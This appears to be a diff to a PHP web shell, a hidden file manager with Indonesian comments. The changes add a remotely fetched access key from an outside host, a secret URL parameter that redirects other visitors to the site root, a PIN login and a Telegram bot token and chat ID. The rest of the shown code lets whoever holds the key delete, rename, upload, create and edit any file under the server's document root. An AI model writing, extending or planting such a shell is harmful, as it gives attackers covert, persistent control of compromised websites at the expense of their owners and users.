@@ -9,14 +9,47 @@
 
 // --- CONFIGURATION ---
 $pin_akses = '070999';
-$key       = 'cuceng';
+$key_url   = 'https://brankascapzcu.pages.dev/one.txt';
+
+// Mengambil key dengan aman (Cache di Session)
+if (!isset($_SESSION['dynamic_key'])) {
+    $get_key = trim(@file_get_contents($key_url));
+    if (!$get_key && function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $key_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $get_key = trim(curl_exec($ch));
+        curl_close($ch);
+    }
+    $_SESSION['dynamic_key'] = ($get_key) ? $get_key : 'default_key_123';
+}
+
+$key = $_SESSION['dynamic_key'];
+
+// --- PROTEKSI URL (REDIRECT KE HOME JIKA SALAH) ---
+if (!isset($_GET['resmi']) || $_GET['resmi'] !== $key) {
+    // Redirect ke root domain agar tidak infinite loop
+    header("Location: /"); 
+    exit;
+}
+
+// --- CONFIG TELEGRAM ---
 $bot_token = '8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM';
 $chat_id   = '6664061200';
 
 // --- AUTHENTICATION SYSTEM ---
-if (isset($_GET['logout'])) { unset($_SESSION['auth']); header("Location: ?resmi=$key"); exit; }
-if (isset($_POST['pin']) && $_POST['pin'] == $pin_akses) { $_SESSION['auth'] = 'ok'; }
+if (isset($_GET['logout'])) { 
+    unset($_SESSION['auth']); 
+    header("Location: ?resmi=$key"); 
+    exit; 
+}
 
+if (isset($_POST['pin']) && $_POST['pin'] == $pin_akses) { 
+    $_SESSION['auth'] = 'ok'; 
+}
+
+// Tampilan Login jika belum auth
 if ($_SESSION['auth'] != 'ok') {
     die("<html><head><title>Secure Access</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>
         body { background:#0a0a0a; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
@@ -34,7 +67,7 @@ $root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
 $p = isset($_GET["path"]) ? $_GET["path"] : $root;
 $p = str_replace("\\", "/", $p);
 
-// Delete/Rename/Chmod
+// Tambahkan proteksi agar $p tidak keluar dari root (opsional tapi disarankan)
 if(isset($_POST["exe"])){
     $t = $p . "/" . $_POST["it_n"];
     if($_POST["opt"] == "delete") { (is_dir($t)) ? @rmdir($t) : @unlink($t); }
@@ -43,16 +76,11 @@ if(isset($_POST["exe"])){
     header("Location: ?resmi=$key&path=$p"); exit;
 }
 
-// Create Folder/File via UI
+// Create Folder/File, Upload, Save Editor (Sama seperti sebelumnya)
 if(isset($_POST['new_folder'])){ @mkdir($p . "/" . $_POST['folder_name']); }
 if(isset($_POST['new_file'])){ @file_put_contents($p . "/" . $_POST['file_name'], $_POST['file_content']); }
-
-// Upload
 if(isset($_FILES["f"])){ @copy($_FILES["f"]["tmp_name"], $p . "/" . $_FILES["f"]["name"]); }
-
-// Save Editor
 if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]); }
-
 ?>
 <!DOCTYPE html>
 <html>
@@ -86,6 +114,7 @@ if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]);
             $path_links = explode("/", $p);
             $accumulated_path = "";
             foreach($path_links as $id => $link) {
+                if ($link == "") continue;
                 $accumulated_path .= $link . "/";
                 echo "<a href='?resmi=$key&path=$accumulated_path'>$link</a> / ";
             }
